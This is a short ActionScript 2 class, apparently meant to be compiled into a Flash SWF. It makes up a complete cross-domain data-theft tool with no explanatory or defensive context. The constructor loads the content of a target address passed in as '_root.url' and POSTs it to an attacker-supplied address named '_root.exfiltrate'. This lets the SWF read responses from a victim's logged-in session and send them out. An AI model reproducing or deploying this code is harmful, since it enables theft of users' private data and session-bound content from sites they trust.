class X {

	static var app : X;

	function X(mc) {
		if (_root.url) {
			var r:LoadVars = new LoadVars();
			r.onData = function(src:String) {
				if (_root.exfiltrate) {
					var w:LoadVars = new LoadVars();
					w.x = src;
					w.sendAndLoad(_root.exfiltrate, w, "POST");
				}
			}
			r.load(_root.url, r, "GET");
		}
	}

	// entry point
	static function main(mc) {
		app = new X(mc);
	}
}
